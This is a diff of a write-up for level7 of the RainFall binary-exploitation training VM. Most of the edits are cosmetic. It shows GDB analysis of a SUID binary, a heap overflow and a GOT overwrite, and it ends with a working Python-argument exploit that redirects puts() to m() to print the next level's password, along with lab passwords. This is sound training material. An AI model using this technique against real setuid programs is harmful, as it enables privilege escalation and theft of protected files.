@@ -1,8 +1,17 @@
 Login as `level7`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.0.19 -p 4242 -l level7
 level7@192.168.0.19's password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -17,7 +26,7 @@ total 8
 0x08048521  main
 [...]
 ```
-Examing binary with GDB shows that inside `main()` function it opens `/home/user/level8/.pass` file, then reads 68 bytes from the given stream and stores them in the string `c` defined as global variable.
+Examine binary with GDB shows that inside `main()` function it opens `/home/user/level8/.pass` file, then reads 68 bytes from the given stream and stores them in the string `c` defined as global variable.
 On the other hand the content of `c` variable is printed inside `m()` function.
 
 Function `m()` can be called inside GDB simply by changing `EIP` register pointing to start of `m()` function.
@@ -35,7 +44,7 @@ $1 = (void (*)()) 0x80485eb <main+202>
 Continuing.
  - 1630930163
 
-Program received signal SIGSEGV, Segmentation fault.
+Program received signal `SIGSEGV`, Segmentation fault.
 0x08049960 in c ()
 ```
 
@@ -80,12 +89,12 @@ Dump of assembler code for function fgets@plt:
    0x080483c6 <+6>:	push   $0x8
    0x080483cb <+11>:	jmp    0x80483a0
 End of assembler dump.
-(gdb) x/wx 0x8049918						# Check referencing address
+(gdb) x/wx 0x8049918					# Check referencing address
 0x8049918 <fgets@got.plt>:	0x080483c6 
 (gdb) set *0x8049918=0x080484f4				# Change value of address pointing from `fgets()` to `m()`
-(gdb) x/wx 0x8049918						# Address of GOT entry successfully changed
+(gdb) x/wx 0x8049918					# Address of GOT entry successfully changed
 0x8049918 <fgets@got.plt>:	0x080484f4
-(gdb) continue								# Execution of `m()`
+(gdb) continue					        # Execution of `m()`
 Continuing.
  - 1633277327
 ~~
@@ -93,7 +102,7 @@ Continuing.
 ```
 
 
-Break on each functions call and execute first malloc instruction to gead heap addresses.
+Break on each functions call and execute first `malloc()` instruction to get heap addresses.
 ```gdb
 (gdb) break *main+16
 Breakpoint 1 at 0x8048531
@@ -156,7 +165,7 @@ End with a line saying just "end".
 (gdb) continue
 Continuing.
 
-Program received signal SIGSEGV, Segmentation fault.
+Program received signal `SIGSEGV`, Segmentation fault.
 0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
 #                                   str1[0]=1    str1[1]=malloc(8)
 0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
@@ -175,7 +184,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb) continue
 Continuing.
 
-Program terminated with signal SIGSEGV, Segmentation fault.
+Program terminated with signal `SIGSEGV`, Segmentation fault.
 The program no longer exists.
 0x804a000:	Error while running hook_stop:
 Cannot access memory at address 0x804a000
@@ -191,6 +200,10 @@ End of assembler dump.
 (gdb) x 0x8049928
 0x8049928 <puts@got.plt>:	0x08048406k
 (gdb) quit
+```
+
+Exploit and log on to the next level.
+```shell
 level7@RainFall:~$ ./level7 $(python -c "import struct; print 'AAAA'*5 + struct.pack('I', 0x8049928)") $(python -c "import struct; print struct.pack('I', 0x80484f4)")
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1634572244
